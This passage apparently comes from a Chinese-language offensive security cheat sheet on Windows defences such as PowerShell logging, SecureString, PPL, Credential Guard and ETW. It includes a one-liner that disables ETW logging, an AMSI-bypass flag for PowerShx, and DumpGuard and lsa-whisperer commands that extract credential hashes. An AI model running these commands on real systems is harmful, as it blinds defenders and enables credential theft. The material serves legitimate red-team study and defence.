+<a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a><span class="n">rundll32</span> <span class="n">PowerShx</span><span class="p">.</span><span class="n">dll</span><span class="p">,</span><span class="n">main</span> <span class="n">-s</span>                           <span class="n">尝试绕过</span> <span class="n">AMSI</span>
+<a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a><span class="n">rundll32</span> <span class="n">PowerShx</span><span class="p">.</span><span class="n">dll</span><span class="p">,</span><span class="n">main</span> <span class="n">-v</span>                           <span class="n">将执行输出打印到控制台</span>
+</code></pre></div>
+</li>
+</ul>
+<h3 id="_2">脚本块与模块日志记录</h3>
+<blockquote>
+<p>一旦启用了脚本块日志记录，执行的脚本块和命令将记录在 “Windows PowerShell” 频道下的 Windows 事件日志中。要查看日志，管理员可以使用事件查看器应用程序并导航至 “Windows PowerShell” 频道。</p>
+</blockquote>
+<p>启用脚本块日志记录：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="k">function</span> <span class="nb">Enable-PSScriptBlockLogging</span>
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="p">{</span>
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>    <span class="nv">$basePath</span> <span class="p">=</span> <span class="s1">&#39;HKLM:\Software\Policies\Microsoft\Windows&#39;</span> <span class="p">+</span>
+<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>      <span class="s1">&#39;\PowerShell\ScriptBlockLogging&#39;</span>
+<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>
+<a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>    <span class="k">if</span><span class="p">(</span><span class="o">-not</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="nv">$basePath</span><span class="p">))</span>
+<a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>    <span class="p">{</span>
+<a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>        <span class="nv">$null</span> <span class="p">=</span> <span class="nb">New-Item</span> <span class="nv">$basePath</span> <span class="n">-Force</span>
+<a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a>    <span class="p">}</span>
+<a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a>
+<a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a>    <span class="nb">Set-ItemProperty</span> <span class="nv">$basePath</span> <span class="n">-Name</span> <span class="n">EnableScriptBlockLogging</span> <span class="n">-Value</span> <span class="s2">&quot;1&quot;</span>
+<a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a><span class="p">}</span>
+</code></pre></div>
+<p>使用 <a href="https://gist.github.com/tandasat/e595c77c52e13aaee60e1e8b65d2ba32">tandasat/KillETW.ps1</a> 禁用当前 PowerShell 会话的 ETW：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="c"># 此 PowerShell 命令将 0 设置给 System.Management.Automation.Tracing.PSEtwLogProvider etwProvider.m_enabled，从而有效地禁用可疑脚本块日志记录等。</span>
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="no">[Reflection.Assembly]</span><span class="p">::</span><span class="n">LoadWithPartialName</span><span class="p">(</span><span class="s1">&#39;System.Core&#39;</span><span class="p">).</span><span class="n">GetType</span><span class="p">(</span><span class="s1">&#39;System.Diagnostics.Eventing.EventProvider&#39;</span><span class="p">).</span><span class="n">GetField</span><span class="p">(</span><span class="s1">&#39;m_enabled&#39;</span><span class="p">,</span><span class="s1">&#39;NonPublic,Instance&#39;</span><span class="p">).</span><span class="n">SetValue</span><span class="p">(</span><span class="no">[Ref]</span><span class="p">.</span><span class="n">Assembly</span><span class="p">.</span><span class="n">GetType</span><span class="p">(</span><span class="s1">&#39;System.Management.Automation.Tracing.PSEtwLogProvider&#39;</span><span class="p">).</span><span class="n">GetField</span><span class="p">(</span><span class="s1">&#39;etwProvider&#39;</span><span class="p">,</span><span class="s1">&#39;NonPublic,Static&#39;</span><span class="p">).</span><span class="n">GetValue</span><span class="p">(</span><span class="nv">$null</span><span class="p">),</span><span class="n">0</span><span class="p">)</span>
+</code></pre></div>
+<h3 id="powershell-transcript">PowerShell 成文记录 (Transcript)</h3>
+<p>PowerShell 成文记录是一项日志记录功能，它记录 PowerShell 会话中的所有命令和输出。它通过将会话活动保存到文本文件中，有助于审计、调试和故障排除。</p>
+<p>启动成文记录并将输出存储在自定义文件中：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="nb">Start-Transcript</span> <span class="n">-Path</span> <span class="s2">&quot;C:\transcripts\transcript0.txt&quot;</span> <span class="n">-NoClobber</span>
+</code></pre></div>
+<p>PowerShell 成文记录输出的常见位置：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\&lt;</span><span class="n">用户名</span><span class="p">&gt;\</span><span class="n">Documents</span><span class="p">\</span><span class="n">PowerShell_transcript</span><span class="p">.&lt;</span><span class="n">主机名</span><span class="p">&gt;.&lt;</span><span class="n">随机字符</span><span class="p">&gt;.&lt;</span><span class="n">时间戳</span><span class="p">&gt;.</span><span class="n">txt</span>
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="n">C</span><span class="p">:\</span><span class="n">Transcripts</span><span class="p">\&lt;</span><span class="n">日期</span><span class="p">&gt;\</span><span class="n">PowerShell_transcript</span><span class="p">.&lt;</span><span class="n">主机名</span><span class="p">&gt;.&lt;</span><span class="n">随机字符</span><span class="p">&gt;.&lt;</span><span class="n">时间戳</span><span class="p">&gt;.</span><span class="n">txt</span>
+</code></pre></div>
+<h3 id="securestring">安全字符串 (SecureString)</h3>
+<p>PowerShell 中的 <code>SecureString</code> 是一种数据类型，旨在以比纯字符串更安全的方式存储密码或机密数据等敏感信息。与以纯文本存储数据且易于在内存中访问的常规字符串不同，<code>SecureString</code> 在内存中对数据进行加密，为防止未经授权的访问提供了更好的保护。</p>
+<p>转换为 SecureString</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="nv">$original</span> <span class="p">=</span> <span class="s1">&#39;我的密码&#39;</span>  
+<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="nv">$secureString</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="nv">$original</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
+<a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="nv">$secureStringValue</span> <span class="p">=</span> <span class="nb">ConvertFrom-SecureString</span> <span class="nv">$secureString</span>
+</code></pre></div>
+<p>获取原始内容</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="nv">$secureStringBack</span> <span class="p">=</span> <span class="nv">$secureStringValue</span> <span class="p">|</span> <span class="nb">ConvertTo-SecureString</span>
+<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="nv">$bstr</span> <span class="p">=</span> <span class="no">[System.Runtime.InteropServices.Marshal]</span><span class="p">::</span><span class="n">SecureStringToBSTR</span><span class="p">(</span><span class="nv">$secureStringBack</span><span class="p">);</span>
+<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="nv">$finalValue</span> <span class="p">=</span> <span class="no">[System.Runtime.InteropServices.Marshal]</span><span class="p">::</span><span class="n">PtrToStringAuto</span><span class="p">(</span><span class="nv">$bstr</span><span class="p">)</span>
+</code></pre></div>
+<p>当创建 <code>SecureString</code> 时，纯文本字符会立即使用数据保护 API (<strong>DPAPI</strong>) 进行加密。</p>
+<p>使用 AES 密钥</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="no">[Byte[]]</span> <span class="nv">$key</span> <span class="p">=</span> <span class="p">(</span><span class="n">49</span><span class="p">,</span><span class="n">222</span><span class="p">,...,</span><span class="n">87</span><span class="p">,</span><span class="n">159</span><span class="p">)</span>
+<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="nv">$pass</span> <span class="p">=</span> <span class="p">(</span><span class="nb">echo </span><span class="s2">&quot;AA...AA=&quot;</span> <span class="p">|</span> <span class="nb">ConvertTo-SecureString</span> <span class="n">-Key</span> <span class="nv">$key</span><span class="p">)</span>
+<a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a><span class="no">[Runtime.InteropServices.Marshal]</span><span class="p">::</span><span class="n">PtrToStringAuto</span><span class="p">(</span><span class="no">[Runtime.InteropServices.Marshal]</span><span class="p">::</span><span class="n">SecureStringToBSTR</span><span class="p">(</span><span class="nv">$pass</span><span class="p">))</span>
+</code></pre></div>
+<h2 id="ppl">受保护进程光 (PPL)</h2>
+<p>受保护进程光 (PPL) 作为一种 Windows 安全机制实现，它允许将进程标记为 “受保护”，并在一个安全且隔离的环境中运行，在该环境中，它们可以免受恶意软件或其他未经授权进程的攻击。PPL 用于保护对操作系统运行至关重要的进程，如防病毒软件、防火墙和其他安全相关的进程。</p>
+<p>当进程使用 PPL 被标记为 “受保护” 时，它会被分配一个安全级别，该级别决定了它将获得的保护水平。此安全级别可以设置为多个级别之一，从低到高。被分配到较高安全级别的进程比被分配到较低安全级别的进程获得更多的保护。</p>
+<p>进程的保护由 “级别” 和 “签名者” 的组合定义。下表代表了常用的组合，源自 <a href="https://itm4n.github.io/lsass-runasppl/">itm4n.github.io</a>。</p>
+<table>
+<thead>
+<tr>
+<th>保护级别</th>
+<th>值</th>
+<th>签名者</th>
+<th>类型</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>PS_PROTECTED_SYSTEM</td>
+<td>0x72</td>
+<td>WinSystem (7)</td>
+<td>Protected (2)</td>
+</tr>
+<tr>
+<td>PS_PROTECTED_WINTCB</td>
+<td>0x62</td>
+<td>WinTcb (6)</td>
+<td>Protected (2)</td>
+</tr>
+<tr>
+<td>PS_PROTECTED_WINDOWS</td>
+<td>0x52</td>
+<td>Windows (5)</td>
+<td>Protected (2)</td>
+</tr>
+<tr>
+<td>PS_PROTECTED_AUTHENTICODE</td>
+<td>0x12</td>
+<td>Authenticode (1)</td>
+<td>Protected (2)</td>
+</tr>
+<tr>
+<td>PS_PROTECTED_WINTCB_LIGHT</td>
+<td>0x61</td>
+<td>WinTcb (6)</td>
+<td>Protected Light (1)</td>
+</tr>
+<tr>
+<td>PS_PROTECTED_WINDOWS_LIGHT</td>
+<td>0x51</td>
+<td>Windows (5)</td>
+<td>Protected Light (1)</td>
+</tr>
+<tr>
+<td>PS_PROTECTED_LSA_LIGHT</td>
+<td>0x41</td>
+<td>Lsa (4)</td>
+<td>Protected Light (1)</td>
+</tr>
+<tr>
+<td>PS_PROTECTED_ANTIMALWARE_LIGHT</td>
+<td>0x31</td>
+<td>Antimalware (3)</td>
+<td>Protected Light (1)</td>
+</tr>
+<tr>
+<td>PS_PROTECTED_AUTHENTICODE_LIGHT</td>
+<td>0x11</td>
+<td>Authenticode (1)</td>
+<td>Protected Light (1)</td>
+</tr>
+</tbody>
+</table>
+<p>PPL 通过限制对受保护进程内存和系统资源的访问，以及防止进程被其他进程或用户修改或终止来工作。该进程也与系统中运行的其他进程隔离，这有助于防止尝试利用共享资源或依赖项的攻击。</p>
+<ul>
+<li>
+<p>检查 LSASS 是否在 PPL 中运行</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="n">reg</span> <span class="n">query</span> <span class="n">HKEY_LOCAL_MACHINE</span><span class="p">\</span><span class="n">SYSTEM</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">Control</span><span class="p">\</span><span class="n">Lsa</span> <span class="p">/</span><span class="n">v</span> <span class="n">RunAsPPL</span>
+</code></pre></div>
+</li>
+<li>
+<p>受保护进程示例：即使拥有管理员权限，也无法终止 Microsoft Defender。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="n">taskkill</span> <span class="p">/</span><span class="n">f</span> <span class="p">/</span><span class="n">im</span> <span class="n">MsMpEng</span><span class="p">.</span><span class="n">exe</span>
+<a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="n">错误</span><span class="p">:</span> <span class="n">无法终止</span> <span class="n">PID</span> <span class="n">为</span> <span class="n">5784</span> <span class="n">的进程</span> <span class="s2">&quot;MsMpEng.exe&quot;</span><span class="err">。</span>
+<a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a><span class="n">原因</span><span class="p">:</span> <span class="n">拒绝访问</span><span class="err">。</span>
+</code></pre></div>
+</li>
+<li>
+<p>可以使用存在漏洞的驱动程序（自带漏洞驱动程序 / BYOVD）将其禁用。</p>
+</li>
+</ul>
+<h2 id="credential-guard">凭据守卫 (Credential Guard)</h2>
+<p>当启用凭据守卫时，它使用基于硬件的虚拟化来创建一个与操作系统分离的安全环境。该安全环境用于存储敏感的凭据信息，这些信息经过加密并受到保护，防止未经授权的访问。</p>
+<p>凭据守卫结合使用基于硬件的虚拟化和可信平台模块 (TPM)，以确保安全内核是可信且安全的。它可以在具有兼容处理器和 TPM 版本的设备上启用，并且需要支持必要特性的 UEFI 固件。</p>
+<ul>
+<li><a href="https://github.com/bytewreck/DumpGuard">bytewreck/DumpGuard</a> - 用于从现代 Windows 系统会话中提取 NTLMv1 哈希的验证工具。</li>
+<li><a href="https://github.com/EvanMcBroom/lsa-whisperer">EvanMcBroom/lsa-whisperer</a> - 用于使用各自的消息协议与身份验证包进行交互的工具。</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>技术</th>
+<th style="text-align: center;">需要<br>SYSTEM</th>
+<th style="text-align: center;">需要<br>SPN 账户</th>
+<th style="text-align: center;">能否转储<br>Credential Guard</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>通过远程凭据守卫协议提取自己的凭据</td>
+<td style="text-align: center;"><img alt="❌" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@16.0.1/assets/svg/274c.svg" title=":x:" /></td>
+<td style="text-align: center;">✅</td>
+<td style="text-align: center;">✅</td>
+</tr>
+<tr>
+<td>通过远程凭据守卫协议提取所有凭据</td>
+<td style="text-align: center;">✅</td>
+<td style="text-align: center;">✅</td>
+<td style="text-align: center;">✅</td>
+</tr>
+<tr>
+<td>通过 Microsoft v1 身份验证包提取所有凭据</td>
+<td style="text-align: center;">✅</td>
+<td style="text-align: center;"><img alt="❌" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@16.0.1/assets/svg/274c.svg" title=":x:" /></td>
+<td style="text-align: center;"><img alt="❌" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@16.0.1/assets/svg/274c.svg" title=":x:" /></td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>
+<p><strong>使用远程凭据守卫转储自己的会话</strong>：无论凭据守卫的状态如何，这都有效，但需要已启用 SPN 账户的凭据。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="n">DumpGuard</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">mode</span><span class="p">:</span><span class="n">self</span> <span class="p">/</span><span class="n">domain</span><span class="p">:&lt;</span><span class="n">域名</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">username</span><span class="p">:&lt;</span><span class="n">sAMAccountName</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">password</span><span class="p">:&lt;</span><span class="n">密码</span><span class="p">&gt;</span> <span class="p">[/</span><span class="n">spn</span><span class="p">:&lt;</span><span class="n">SPN</span><span class="p">&gt;]</span>
+</code></pre></div>
+</li>
+<li>
+<p><strong>使用远程凭据守卫转储所有会话</strong>：无论凭据守卫的状态如何，这都有效，但需要已启用 SPN 账户的凭据以及 <code>SYSTEM</code> 权限。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="n">DumpGuard</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">mode</span><span class="p">:</span><span class="n">all</span> <span class="p">/</span><span class="n">domain</span><span class="p">:&lt;</span><span class="n">域名</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">username</span><span class="p">:&lt;</span><span class="n">sAMAccountName</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">password</span><span class="p">:&lt;</span><span class="n">密码</span><span class="p">&gt;</span> <span class="p">[/</span><span class="n">spn</span><span class="p">:&lt;</span><span class="n">SPN</span><span class="p">&gt;]</span>
+</code></pre></div>
+</li>
+<li>
+<p><strong>使用 Microsoft v1 身份验证包转储所有会话</strong></p>
+<ul>
+<li>本地系统上已禁用凭据守卫。</li>
+<li>远程用户通过远程凭据守卫从远程主机身份验证到本地系统。</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="n">DumpGuard</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">mode</span><span class="p">:</span><span class="n">all</span>
+<a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="c"># 或</span>
+<a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a><span class="n">lsa-whisperer</span><span class="p">.</span><span class="n">exe</span> <span class="n">msv1_0</span> <span class="n">Lm20GetChallengeResponse</span> <span class="p">-</span><span class="n">-luid</span> <span class="p">{</span><span class="n">会话</span> <span class="n">ID</span><span class="p">}</span> <span class="p">-</span><span class="n">-challenge</span> <span class="p">{</span><span class="n">发给客户端的挑战</span><span class="p">}</span> <span class="p">[</span><span class="n">标志</span><span class="p">...]</span>
+</code></pre></div>
+</li>
+</ul>
+<h2 id="windows-etw">Windows 事件跟踪 (ETW)</h2>
+<p>ETW (Windows 事件跟踪) 是一种基于 Windows 的日志记录机制，提供了一种实时收集和分析系统事件及性能数据的方法。ETW 允许开发人员和系统管理员收集有关系统性能和行为的详细信息，这些信息可用于故障排除、优化和安全目的。</p>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>GUID</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Microsoft-Antimalware-Scan-Interface</td>
+<td>{2A576B87-09A7-520E-C21A-4942F0271D67}</td>
+</tr>
+<tr>
+<td>Microsoft-Windows-PowerShell</td>
+<td>{A0C1853B-5C40-4B15-8766-3CF1C58F985A}</td>
+</tr>
+<tr>
+<td>Microsoft-Antimalware-Protection</td>
+<td>{E4B70372-261F-4C54-8FA6-A5A7914D73DA}</td>
+</tr>
+<tr>
+<td>Microsoft-Windows-Threat-Intelligence</td>
+<td>{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}</td>
+</tr>
+</tbody>
+</table>
+<p>你可以查看 Windows 中注册的所有提供程序：<code>logman query providers</code></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">User</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="n">logman</span> <span class="n">query</span> <span class="n">providers</span>
+<a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>
+<a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a><span class="n">提供程序</span>                                 <span class="n">GUID</span>
+<a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a><span class="p">-------------------------------------------------------------------------------</span>
+<a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a><span class="p">.</span><span class="n">NET</span> <span class="n">Common</span> <span class="n">Language</span> <span class="n">Runtime</span>             <span class="p">{</span><span class="n">E13C0D23-CCBC</span><span class="p">-</span><span class="n">4E12</span><span class="p">-</span><span class="n">931B-D9CC2EEE27E4</span><span class="p">}</span>
+<a id="__codelineno-25-6" name="__codelineno-25-6" href="#__codelineno-25-6"></a><span class="n">ACPI</span> <span class="n">Driver</span> <span class="n">Trace</span> <span class="n">Provider</span>               <span class="p">{</span><span class="n">DAB01D4D</span><span class="p">-</span><span class="n">2D48</span><span class="p">-</span><span class="n">477D-B1C3-DAAD0CE6F06B</span><span class="p">}</span>
+<a id="__codelineno-25-7" name="__codelineno-25-7" href="#__codelineno-25-7"></a><span class="n">Active</span> <span class="n">Directory</span> <span class="n">Domain</span> <span class="n">Services</span><span class="p">:</span> <span class="n">SAM</span>    <span class="p">{</span><span class="n">8E598056</span><span class="p">-</span><span class="n">8993</span><span class="p">-</span><span class="n">11D2</span><span class="p">-</span><span class="n">819E</span><span class="p">-</span><span class="n">0000F875A064</span><span class="p">}</span>
+<a id="__codelineno-25-8" name="__codelineno-25-8" href="#__codelineno-25-8"></a><span class="n">Active</span> <span class="n">Directory</span><span class="p">:</span> <span class="n">Kerberos</span> <span class="n">Client</span>        <span class="p">{</span><span class="n">BBA3ADD2-C229</span><span class="p">-</span><span class="n">4CDB-AE2B</span><span class="p">-</span><span class="n">57EB6966B0C4</span><span class="p">}</span>
+<a id="__codelineno-25-9" name="__codelineno-25-9" href="#__codelineno-25-9"></a><span class="n">Active</span> <span class="n">Directory</span><span class="p">:</span> <span class="n">NetLogon</span>               <span class="p">{</span><span class="n">F33959B4-DBEC</span><span class="p">-</span><span class="n">11D2</span><span class="p">-</span><span class="n">895B</span><span class="p">-</span><span class="n">00C04F79AB69</span><span class="p">}</span>
+<a id="__codelineno-25-10" name="__codelineno-25-10" href="#__codelineno-25-10"></a><span class="n">ADODB</span><span class="p">.</span><span class="n">1</span>                                  <span class="p">{</span><span class="n">04C8A86F</span><span class="p">-</span><span class="n">3369</span><span class="p">-</span><span class="n">12F8</span><span class="p">-</span><span class="n">4769</span><span class="p">-</span><span class="n">24E484A9E725</span><span class="p">}</span>
+<a id="__codelineno-25-11" name="__codelineno-25-11" href="#__codelineno-25-11"></a><span class="n">ADOMD</span><span class="p">.</span><span class="n">1</span>                                  <span class="p">{</span><span class="n">7EA56435</span><span class="p">-</span><span class="n">3F2F</span><span class="p">-</span><span class="n">3F63-A829-F0B35B5CAD41</span><span class="p">}</span>
+<a id="__codelineno-25-12" name="__codelineno-25-12" href="#__codelineno-25-12"></a><span class="p">...</span>
+</code></pre></div>
+<p>我们可以通过以下命令获取有关提供程序的更多信息：<code>logman query providers {ProviderID}/Provider-Name</code></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">User</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="n">logman</span> <span class="n">query</span> <span class="n">providers</span> <span class="n">Microsoft-Antimalware-Scan-Interface</span>
+<a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>
+<a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a><span class="n">提供程序</span>                                 <span class="n">GUID</span>
+<a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a><span class="p">-------------------------------------------------------------------------------</span>
+<a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a><span class="n">Microsoft-Antimalware-Scan-Interface</span>     <span class="p">{</span><span class="n">2A576B87</span><span class="p">-</span><span class="n">09A7</span><span class="p">-</span><span class="n">520E-C21A</span><span class="p">-</span><span class="n">4942F0271D67</span><span class="p">}</span>
+<a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a>
+<a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a><span class="n">值</span>                   <span class="n">关键字</span>               <span class="n">描述</span>
+<a id="__codelineno-26-8" name="__codelineno-26-8" href="#__codelineno-26-8"></a><span class="p">-------------------------------------------------------------------------------</span>
+<a id="__codelineno-26-9" name="__codelineno-26-9" href="#__codelineno-26-9"></a><span class="n">0x0000000000000001</span>  <span class="n">Event1</span>
+<a id="__codelineno-26-10" name="__codelineno-26-10" href="#__codelineno-26-10"></a><span class="n">0x8000000000000000</span>  <span class="n">AMSI</span><span class="p">/</span><span class="n">Debug</span>
+<a id="__codelineno-26-11" name="__codelineno-26-11" href="#__codelineno-26-11"></a>
+<a id="__codelineno-26-12" name="__codelineno-26-12" href="#__codelineno-26-12"></a><span class="n">值</span>                   <span class="n">级别</span>                 <span class="n">描述</span>
+<a id="__codelineno-26-13" name="__codelineno-26-13" href="#__codelineno-26-13"></a><span class="p">-------------------------------------------------------------------------------</span>
+<a id="__codelineno-26-14" name="__codelineno-26-14" href="#__codelineno-26-14"></a><span class="n">0x04</span>                <span class="n">win</span><span class="p">:</span><span class="n">Informational</span>    <span class="n">信息</span>
+<a id="__codelineno-26-15" name="__codelineno-26-15" href="#__codelineno-26-15"></a>
+<a id="__codelineno-26-16" name="__codelineno-26-16" href="#__codelineno-26-16"></a><span class="n">PID</span>                 <span class="n">图像</span>
+<a id="__codelineno-26-17" name="__codelineno-26-17" href="#__codelineno-26-17"></a><span class="p">-------------------------------------------------------------------------------</span>
+<a id="__codelineno-26-18" name="__codelineno-26-18" href="#__codelineno-26-18"></a><span class="n">0x00002084</span>          <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">WindowsPowerShell</span><span class="p">\</span><span class="n">v1</span><span class="p">.</span><span class="n">0</span><span class="p">\</span><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span>
+<a id="__codelineno-26-19" name="__codelineno-26-19" href="#__codelineno-26-19"></a><span class="n">0x00002084</span>          <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">WindowsPowerShell</span><span class="p">\</span><span class="n">v1</span><span class="p">.</span><span class="n">0</span><span class="p">\</span><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span>
+<a id="__codelineno-26-20" name="__codelineno-26-20" href="#__codelineno-26-20"></a><span class="n">0x00001bd4</span>
+<a id="__codelineno-26-21" name="__codelineno-26-21" href="#__codelineno-26-21"></a><span class="n">0x00000ad0</span>
+<a id="__codelineno-26-22" name="__codelineno-26-22" href="#__codelineno-26-22"></a><span class="n">0x00000b98</span>
+</code></pre></div>
+<p><code>Microsoft-Windows-Threat-Intelligence</code> 提供程序对应于 ETWTI，这是 EDR 可以订阅并识别恶意 API 使用（如进程注入）的额外安全功能。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="n">0x0000000000000001</span>  <span class="n">KERNEL_THREATINT_KEYWORD_ALLOCVM_LOCAL</span>
+<a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a><span class="n">0x0000000000000002</span>  <span class="n">KERNEL_THREATINT_KEYWORD_ALLOCVM_LOCAL_KERNEL_CALLER</span>
+<a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a><span class="n">0x0000000000000004</span>  <span class="n">KERNEL_THREATINT_KEYWORD_ALLOCVM_REMOTE</span>
+<a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a><span class="n">0x0000000000000008</span>  <span class="n">KERNEL_THREATINT_KEYWORD_ALLOCVM_REMOTE_KERNEL_CALLER</span>
+<a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a><span class="n">0x0000000000000010</span>  <span class="n">KERNEL_THREATINT_KEYWORD_PROTECTVM_LOCAL</span>
+<a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a><span class="n">0x0000000000000020</span>  <span class="n">KERNEL_THREATINT_KEYWORD_PROTECTVM_LOCAL_KERNEL_CALLER</span>
+<a id="__codelineno-27-7" name="__codelineno-27-7" href="#__codelineno-27-7"></a><span class="n">0x0000000000000040</span>  <span class="n">KERNEL_THREATINT_KEYWORD_PROTECTVM_REMOTE</span>
+<a id="__codelineno-27-8" name="__codelineno-27-8" href="#__codelineno-27-8"></a><span class="n">0x0000000000000080</span>  <span class="n">KERNEL_THREATINT_KEYWORD_PROTECTVM_REMOTE_KERNEL_CALLER</span>
+<a id="__codelineno-27-9" name="__codelineno-27-9" href="#__codelineno-27-9"></a><span class="n">0x0000000000000100</span>  <span class="n">KERNEL_THREATINT_KEYWORD_MAPVIEW_LOCAL</span>
+<a id="__codelineno-27-10" name="__codelineno-27-10" href="#__codelineno-27-10"></a><span class="n">0x0000000000000200</span>  <span class="n">KERNEL_THREATINT_KEYWORD_MAPVIEW_LOCAL_KERNEL_CALLER</span>
+<a id="__codelineno-27-11" name="__codelineno-27-11" href="#__codelineno-27-11"></a><span class="n">0x0000000000000400</span>  <span class="n">KERNEL_THREATINT_KEYWORD_MAPVIEW_REMOTE</span>
